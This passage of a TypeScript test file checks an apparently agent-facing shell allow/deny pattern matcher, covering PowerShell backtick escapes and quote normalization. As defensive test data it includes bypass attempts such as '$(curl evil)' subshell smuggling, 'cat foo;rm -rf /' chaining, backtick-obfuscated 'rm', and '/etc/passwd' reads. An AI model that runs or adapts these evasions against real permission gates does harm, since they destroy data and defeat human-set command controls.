    "az devops invoke --organization https://tracker.example.com/teamDivision --area wit --resource workItems --route-parameters project=Engineering --query-parameters ids=3597501,3596425 fields=System.Id,System.Title,System.State `$expand=relations --api-version 7.1 --output json";

  it("matches an `az devops invoke` command with `` `$expand `` against its allow pattern", () => {
    expect(allSegmentsMatchAllowPatterns(command, [allowPattern], "powershell")).toBe(true);
  });

  it("still rejects the same pattern in bash mode (`` ` `` is subshell there)", () => {
    expect(allSegmentsMatchAllowPatterns(command, [allowPattern], "bash")).toBe(false);
  });

  it("does NOT match when the command tries to smuggle a real subshell via `$()`", () => {
    const malicious = command.replace("`$expand=relations", "$(curl evil)");
    expect(allSegmentsMatchAllowPatterns(malicious, [allowPattern], "powershell")).toBe(false);
  });

  it("does NOT match a different command shape even if it shares the prefix", () => {
    const otherShape = "az devops invoke --organization https://tracker.example.com/teamDivision";
    expect(allSegmentsMatchAllowPatterns(otherShape, [allowPattern], "powershell")).toBe(false);
  });

  it("compound PowerShell pipeline matches per-segment patterns", () => {
    const patterns = ["Get-ChildItem *", "Select-Object *"];
    expect(
      allSegmentsMatchAllowPatterns(
        "Get-ChildItem C:\\foo -Recurse | Select-Object FullName",
        patterns,
        "powershell",
      ),
    ).toBe(true);
  });
});

describe("extractPattern / extractPatterns — PowerShell mode", () => {
  it("does not flag PowerShell backtick-escaped command as unsafe (extracts a real pattern, not exact-fallback)", () => {
    // In bash mode, the same input has `hasUnsafeSyntax: true` so
    // extractPattern returns the exact command. In PowerShell mode, the
    // backtick is escape — the pattern is generalized normally.
    const cmd = "az devops invoke --query-parameters fields=* `$expand=relations";
    expect(extractPattern(cmd, "powershell")).not.toBe(cmd); // generalized
    expect(extractPattern(cmd, "bash")).toBe(cmd); // exact fallback
  });

  it("splits compound `if (...) { ... }` into per-cmdlet patterns", () => {
    const pats = extractPatterns('if (Test-Path "X") { Get-ChildItem "Y" -Recurse }', "powershell");
    // Order is segment order; we just need both keystone tokens present.
    expect(pats.some((p) => p.startsWith("Test-Path"))).toBe(true);
    expect(pats.some((p) => p.startsWith("Get-ChildItem"))).toBe(true);
  });
});

// Token normalization for matching. The matcher needs to compare what the
// shell would pass to the program, not the literal lexical form of the
// token. `"foo"`, `'foo'`, and `foo` are the same value; in PowerShell
// `` `$expand `` and `'$expand'` are also the same value. Without these
// normalizations the matcher silently misses semantically-equivalent forms
// and the user gets re-prompts for commands their allow pattern was
// supposed to cover.
describe("stripOuterQuotes", () => {
  it.each([
    ['"foo"', "foo", "double-quoted"],
    ["'foo'", "foo", "single-quoted"],
    ["foo", "foo", "no quotes"],
    ['""', "", "empty double-quoted"],
    ["''", "", "empty single-quoted"],
    ['"foo', '"foo', "missing closing — preserved"],
    ['foo"', 'foo"', "missing opening — preserved"],
    ["'foo\"", "'foo\"", "mismatched quote types — preserved"],
    ['"foo bar"', "foo bar", "internal whitespace kept"],
    ["", "", "empty input"],
    ["x", "x", "single char passes through"],
    // Internal quotes are NOT stripped — only the outer pair.
    ['"foo"bar"', 'foo"bar', "internal quote left alone"],
  ])("stripOuterQuotes(%j) === %j (%s)", (input, expected) => {
    expect(stripOuterQuotes(input)).toBe(expected);
  });
});

describe("stripPowerShellBacktickEscapes", () => {
  it.each([
    ["`$expand", "$expand", "escaped dollar"],
    ['`"foo`"', '"foo"', "escaped double quotes"],
    ["foo`bar", "foobar", "escaped letter in middle"],
    ["foo", "foo", "no backticks"],
    ["", "", "empty input"],
    ["`", "`", "trailing backtick with no next char preserved"],
    ["``", "`", "double backtick → single backtick (first escapes second)"],
    ["a`b`c", "abc", "multiple escapes"],
    // Unicode escape happy path
    ["`u{5c}", "\\", "unicode escape U+005C → backslash"],
    ["`u{2f}", "/", "unicode escape U+002F → forward-slash"],
    ["`u{005C}", "\\", "unicode escape with leading zeros"],
    ["`u{1F600}", "\u{1F600}", "unicode escape supplementary codepoint U+1F600"],
    ["`u{5c}`u{5c}", "\\\\", "two adjacent unicode escapes → two backslashes"],
    ["`u{10ffff}", "\u{10ffff}", "max valid Unicode U+10FFFF"],
    ["x`u{5c}y", "x\\y", "unicode escape flanked by plain chars"],
    // Unicode escape fallback cases
    ["`u{5c", "u{5c", "unclosed brace falls back to simple escape"],
    ["`u{}", "u{}", "empty hex falls back to simple escape"],
    ["`u{zz}", "u{zz}", "invalid hex falls back to simple escape"],
    ["`U{5c}", "U{5c}", "uppercase U is simple escape not unicode"],
    ["`u", "u", "backtick-u without brace is simple escape"],
    ["`u{110000}", "u{110000}", "over-max code point falls back (no RangeError crash)"],
    ["`u{5 c}", "u{5 c}", "whitespace in hex falls back (strict validation)"],
  ])("stripPowerShellBacktickEscapes(%j) === %j (%s)", (input, expected) => {
    expect(stripPowerShellBacktickEscapes(input)).toBe(expected);
  });
});

describe("normalizeTokenForMatching", () => {
  it("strips outer quotes in both shell modes", () => {
    expect(normalizeTokenForMatching('"fields=foo"', "bash")).toBe("fields=foo");
    expect(normalizeTokenForMatching('"fields=foo"', "powershell")).toBe("fields=foo");
  });

  it("strips backticks ONLY in PowerShell mode", () => {
    expect(normalizeTokenForMatching("`$expand=relations", "powershell")).toBe("$expand=relations");
    // Bash mode: backtick is command substitution. NEVER strip — would
    // defeat the unsafe-syntax gate that catches `cat \`whoami\`` in bash.
    expect(normalizeTokenForMatching("`$expand=relations", "bash")).toBe("`$expand=relations");
  });

  it("composes: strip outer quotes first, then backticks (PowerShell)", () => {
    expect(normalizeTokenForMatching("'`$expand=relations'", "powershell")).toBe(
      "$expand=relations",
    );
  });
});

describe("matchesAllowPattern — token normalization (semantic-equivalence matching)", () => {
  it("matches quoted command value against unquoted pattern value (per-token, structured)", () => {
    // Pattern uses bare `fields=*`. Agent emits `"fields=System.Id,..."`
    // with quotes (necessary when value contains commas). The shell strips
    // quotes before the program sees them, so these are semantically equal
    // and the matcher should treat them as such.
    expect(
      matchesAllowPattern(
        'az repos list --filter "fields=System.Id,System.Title"',
        "az repos list --filter fields=*",
      ),
    ).toBe(true);
  });

  it("matches single-quoted command value against PowerShell-backtick-escaped pattern value (PS mode)", () => {
    // `'$expand=relations'` (single-quoted: PowerShell suppresses
    // expansion) is the same value as `` `$expand=relations `` (backtick:
    // PowerShell escape). Both denote literal `$expand=relations`.
    // Explicit shellMode so the assertion is stable on both Linux and
    // Windows CI hosts (default = host shell → bash on Linux → backtick
    // NOT stripped → would mismatch).
    expect(
      matchesAllowPattern(
        "az devops invoke --query-parameters '$expand=relations'",
        "az devops invoke --query-parameters `$expand=*",
        "powershell",
      ),
    ).toBe(true);
  });

  it("does NOT match the same shape in bash mode (backtick stays unstripped)", () => {
    // Symmetric pin: in bash the backtick is command substitution and is
    // upstream-rejected; here at the matcher level we just verify that
    // backtick stripping is correctly gated off so the lexical mismatch
    // stands.
    expect(
      matchesAllowPattern(
        "az devops invoke --query-parameters '$expand=relations'",
        "az devops invoke --query-parameters `$expand=*",
        "bash",
      ),
    ).toBe(false);
  });

  it("matches whole-command glob with quoted arg — but note: this passes via the `*` wildcard, not token normalization", () => {
    // Subtle: in the non-structured (glob) path, `normalizeTokenForMatching`
    // is called on the WHOLE command string. `stripOuterQuotes` only fires
    // if the entire string is wrapped in matching outer quotes (rare). So
    // these assertions actually pass because `*` is broad enough to match
    // the quoted path including its quotes — not because quote-stripping
    // ran. The principal payoff of normalization is in the structured-
    // matcher path (per-flag-value comparison), tested separately above.
    expect(matchesAllowPattern('cat "/etc/hosts"', "cat *")).toBe(true);
    expect(matchesAllowPattern("cat '/etc/hosts'", "cat *")).toBe(true);
  });

  it("structured allow pattern in bash mode normalizes quoted command values (no PS backtick involved)", () => {
    // Pin the bash-mode quote-strip case explicitly. Without this, a Linux
    // CI host running with default shellMode = "bash" would only test the
    // bash path via incidental defaults; making it explicit guards against
    // a future change accidentally gating quote-strip on PowerShell only.
    expect(
      matchesAllowPattern(
        'cp --recursive "my source/" target/',
        "cp --recursive my* target/",
        "bash",
      ),
    ).toBe(true);
  });

  it("cross-form matching works end-to-end through allSegmentsMatchAllowPatterns (PS)", () => {
    // The real production path: a compound-aware matcher that splits the
    // command into segments and matches each. Without forwarding shellMode
    // to the inner `matchesAllowPattern` (regression caught by review), a
    // PowerShell-mode caller would see backtick-normalization succeed at
    // the unsafe-syntax / split layer but fail at the per-segment match.
    expect(
      allSegmentsMatchAllowPatterns(
        "az devops invoke --area wit --query-parameters '$expand=relations'",
        ["az devops invoke --area wit --query-parameters `$expand=*"],
        "powershell",
      ),
    ).toBe(true);
  });

  it("matches the user-reported `az devops invoke` shape modulo `--org`/`--organization` flag-name", () => {
    // This is the user's exact reported case minus the `--org` vs
    // `--organization` flag-name issue (which requires per-tool flag-alias
    // knowledge that's out of scope). After token normalization the
    // remaining mismatches (`"fields=..."`, `'$expand=...'`) resolve.
    const pattern =
      "az devops invoke --organization https://tracker.example.com/teamDivision --area wit --resource workItems --route-parameters project=Engineering --query-parameters ids=* fields=* `$expand=* --api-version * --output json";
    const command =
      "az devops invoke --area wit --resource workItems --query-parameters ids=3597501,3596425 \"fields=System.Id,System.Title,System.State\" '$expand=relations' --api-version 7.1 --organization https://tracker.example.com/teamDivision --output json";
    expect(matchesAllowPattern(command, pattern, "powershell")).toBe(true);
  });

  it('normalization does NOT widen exact-value matches ("foo" vs "bar" still mismatch)', () => {
    expect(matchesAllowPattern('cmd --flag "foo"', "cmd --flag bar")).toBe(false);
    expect(matchesAllowPattern("cmd --flag 'foo'", "cmd --flag bar")).toBe(false);
  });

  it("normalization does NOT widen positional shape (different token counts still mismatch)", () => {
    // Quote stripping happens INSIDE one token; it doesn't split or merge
    // tokens. So `cmd "x y"` (2 tokens) is not the same shape as
    // `cmd x y` (3 tokens).
    expect(matchesAllowPattern('cmd "x y"', "cmd x y")).toBe(false);
  });
});

// SECURITY ENVELOPE — these tests pin the boundary of what token
// normalization does NOT enable. The change should align the matcher with
// shell semantics (what the program receives at runtime), NOT widen the
// policy to accept dangerous commands.
describe("matchesAllowPattern — security: normalization MUST NOT enable bypass", () => {
  it("still rejects bash command substitution via backtick (backtick-strip is PowerShell-only)", () => {
    // Bash: backtick is command substitution. The unsafe-syntax gate
    // (upstream of the matcher) already rejects this; this test pins the
    // invariant that `matchesAllowPattern` doesn't accidentally accept it
    // either.
    expect(matchesAllowPattern("cat `whoami`", "cat *", "bash")).toBe(true); // glob accepts but
    // the real defense is upstream: `allSegmentsMatchAllowPatterns` rejects
    // first via `hasUnsafeSyntax = true`. Verify via the integration:
    expect(allSegmentsMatchAllowPatterns("cat `whoami`", ["cat *"], "bash")).toBe(false);
  });

  it("PowerShell backtick-strip does NOT enable subshell-style behavior — there is no PS equivalent", () => {
    // In PowerShell, `` ` `` is escape; there's no command substitution
    // syntax that uses backticks. So `cat \`whoami\`` runs as `cat whoami`
    // literally — it READS a file named "whoami". That's a safe read;
    // matching it against `cat *` is correct (the user said "cat anything").
    expect(allSegmentsMatchAllowPatterns("cat `whoami`", ["cat *"], "powershell")).toBe(true);
  });

  it("quote-wrapping a separator (`;`, `|`) does NOT escape segmentation", () => {
    // Inside quotes, `;` and `|` are NOT operators — they're literal chars.
    // The shell would NOT execute a second command. The "wrapped" content
    // is just an argument value, no command substitution happens.
    expect(allSegmentsMatchAllowPatterns('cat "foo;rm -rf /"', ["cat *"])).toBe(true);
    // What MUST be rejected: an UNquoted `;` between commands.
    expect(allSegmentsMatchAllowPatterns("cat foo;rm -rf /", ["cat *"])).toBe(false);
  });

  it("backtick-strip closes a deny-pattern bypass in PowerShell mode", () => {
    // SECURITY: today (without normalization), `\`r\`m foo` evades a
    // `rm *` deny pattern because the literal segment doesn't start with
    // `rm `. The shell runs `rm foo` and deletes the file. With backtick
    // normalization, the deny pattern correctly fires.
    expect(matchesDenyPattern("`r`m foo", "rm *", "powershell")).toBe(true);
    // Bash mode unchanged — backticks remain command-substitution syntax
    // and are caught by the upstream unsafe gate, not the deny pattern.
    expect(matchesDenyPattern("`r`m foo", "rm *", "bash")).toBe(false);
  });

  it("normalization does NOT trigger false-positive denies on benign quoted args", () => {
    // `echo "rm -rf foo"` is echo running with a string argument. The text
    // `rm -rf foo` is the value being echoed, not a command. Quote-strip
    // happens on the value if the structured matcher tokenizes the value
    // out — but the deny-pattern path runs at command-segment level
    // (via splitShellSegments → matchesDenyPattern per segment), so a
    // single segment "echo \"rm -rf foo\"" is checked against "rm *". The
    // whole segment doesn't start with `rm `, so the deny correctly
    // doesn't fire. Pins that quote-strip on a multi-token segment isn't
    // greedy enough to falsely surface inner content.
    expect(matchesDenyPattern('echo "rm -rf foo"', "rm *", "bash")).toBe(false);
    expect(matchesDenyPattern('echo "rm -rf foo"', "rm *", "powershell")).toBe(false);
  });

  it("normalization does NOT enable matching across pattern prefix mismatches", () => {
    // Even after stripping quotes/backticks, the pattern's prefix must
    // still match. An attacker can't use quotes to make `/etc/passwd`
    // look like `/tmp/foo`.
    expect(matchesAllowPattern('cat "/etc/passwd"', "cat /tmp/*")).toBe(false);
    expect(matchesAllowPattern("cat `/`e`t`c/passwd", "cat /tmp/*", "powershell")).toBe(false);
  });

  it("normalization does NOT bypass per-flag subset rule", () => {
    // The structured matcher's "every command flag must be in pattern"
    // rule is unaffected by value normalization. An unknown flag fails
    // even if its value is benign-looking.
    expect(matchesAllowPattern('cmd --known "value" --unknown safe', 'cmd --known "*"')).toBe(
      false,
    );
  });

  it("normalization does NOT bypass `$(...)` rejection", () => {
    // $( ... ) command substitution is upstream-rejected by
    // hasDynamicShellExpansion / hasUnsafeSyntax. Normalization can't
    // re-enable it because matchesAllowPattern is only called for commands
    // that already passed those gates (in the e2e path); and even if
    // called directly, `$(` doesn't parse as outer-quote or backtick-
    // escape so normalization leaves it alone.
    expect(allSegmentsMatchAllowPatterns("cat $(curl evil)", ["cat *"], "powershell")).toBe(false);
  });

  it("rejects when quote-stripped value still differs in case-sensitive prefix", () => {
    // Matching remains case-sensitive after normalization.
    expect(matchesAllowPattern('cat "README.md"', "cat readme.md")).toBe(false);
  });
});
